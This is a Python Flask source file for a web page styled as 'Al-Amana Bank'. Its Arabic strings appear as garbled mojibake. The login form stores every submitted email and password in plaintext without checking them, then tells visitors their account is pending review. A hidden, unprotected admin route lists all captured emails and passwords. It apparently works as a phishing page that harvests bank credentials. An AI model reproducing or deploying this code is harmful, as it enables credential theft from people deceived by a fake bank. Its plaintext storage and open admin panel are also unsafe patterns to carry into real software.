from flask import Flask, render_template_string, request, redirect, url_for, session
import json, os, datetime

app = Flask(__name__)
app.secret_key = "taym_bank_secret"
DB_FILE = "users_data.json"

def get_db():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, "r", encoding="utf-8") as f: return json.load(f)
    return {}

def save_db(data):
    with open(DB_FILE, "w", encoding="utf-8") as f: json.dump(data, f, indent=4)

# ÙˆØ§Ø¬Ù‡Ø© Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ù…ØªØ·ÙˆØ±Ø© (Ø¨Ù†ÙØ³ Ø£Ù„ÙˆØ§Ù† Ø§Ù„Ø´Ø¹Ø§Ø± Ø§Ù„Ù„ÙŠ Ø¨Ø¹ØªÙ‡)
HTML_LAYOUT = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ø¨Ù†Ùƒ Ø§Ù„Ø£Ù…Ø§Ù†Ø© | Al-Amana Bank</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: linear-gradient(135deg, #6e3aff, #00b4ff); color: white; text-align: center; min-height: 100vh; margin: 0; display: flex; align-items: center; justify-content: center; }
        .card { background: rgba(255,255,255,0.1); backdrop-filter: blur(15px); padding: 40px; border-radius: 30px; width: 380px; border: 1px solid rgba(255,255,255,0.2); box-shadow: 0 20px 50px rgba(0,0,0,0.3); }
        .logo { width: 100px; margin-bottom: 20px; border-radius: 20px; }
        input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 12px; border: none; text-align: center; box-sizing: border-box; }
        button { background: #00ffc3; color: #003e30; padding: 12px; border: none; border-radius: 12px; cursor: pointer; font-weight: bold; width: 100%; font-size: 16px; margin-top: 15px; }
        .status-msg { color: #ffcc00; font-weight: bold; background: rgba(0,0,0,0.2); padding: 10px; border-radius: 10px; }
    </style>
</head>
<body>
    <div class="card">
        <img src="https://i.ibb.co/vzB7K6C/bank-logo.png" class="logo" alt="Logo">
        {{ content | safe }}
    </div>
</body>
</html>
'''

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email, password = request.form.get('email'), request.form.get('password')
        db = get_db()
        if email not in db:
            db[email] = {"p": password, "name": "Ù…Ø³ØªØ®Ø¯Ù… Ø¬Ø¯ÙŠØ¯", "birth": "2000-01-01", "balance": 0, "status": "pending", "gift": ""}
            save_db(db)
        session['user'] = email
        return redirect(url_for('dashboard'))
    
    content = '<h2>ğŸ¦ ØªØ³Ø¬ÙŠÙ„ Ø¯Ø®ÙˆÙ„</h2><form method="POST"><input type="email" name="email" placeholder="Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ" required><input type="password" name="password" placeholder="ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±" required><button type="submit">Ø¯Ø®ÙˆÙ„ Ø¢Ù…Ù†</button></form>'
    return render_template_string(HTML_LAYOUT, content=content)

@app.route('/dashboard', methods=['GET', 'POST'])
def dashboard():
    if 'user' not in session: return redirect(url_for('login'))
    db = get_db(); user = db[session['user']]

    if user['status'] == "pending":
        return render_template_string(HTML_LAYOUT, content='<h3>âš ï¸ Ø§Ù„Ø­Ø³Ø§Ø¨ Ù‚ÙŠØ¯ Ø§Ù„Ù…Ø±Ø§Ø¬Ø¹Ø©</h3><p class="status-msg">Ø³ÙŠØªÙ… ØªÙØ¹ÙŠÙ„ Ø­Ø³Ø§Ø¨Ùƒ Ø®Ù„Ø§Ù„ 24 Ø³Ø§Ø¹Ø© Ù„Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª.</p><br><a href="/" style="color:white">ØªØ­Ø¯ÙŠØ«</a>')

    if request.method == 'POST' and 'get_gift' in request.form:
        today = str(datetime.date.today())
        if user['gift'] != today:
            user['balance'] += 1; user['gift'] = today; save_db(db)

    content = f'<h3>ğŸ’° Ø§Ù„Ù…Ø­ÙØ¸Ø©</h3><p>Ø§Ù„Ø±ØµÙŠØ¯: <b>{user["balance"]} Ù†Ù‚Ø·Ø©</b></p><form method="POST"><button name="get_gift">ğŸ Ù‡Ø¯ÙŠØ© ÙŠÙˆÙ…ÙŠØ© (+1)</button></form><hr><p>Ø§Ù„Ø£Ø³Ù…: {user["name"]}</p>'
    return render_template_string(HTML_LAYOUT, content=content)

@app.route('/admin_taym_control')
def admin():
    db = get_db(); html = "<h2>Ù„ÙˆØ­Ø© ØªÙŠÙ…</h2>"
    for e, d in db.items(): html += f"<p>{e} - {d['p']} - <a href='/approve/{e}'>ØªÙØ¹ÙŠÙ„</a></p>"
    return html

@app.route('/approve/<email>')
def approve(email):
    db = get_db()
    if email in db: db[email]['status'] = "approved"; save_db(db)
    return redirect(url_for('admin'))

if __name__ == "__main__":
    app.run()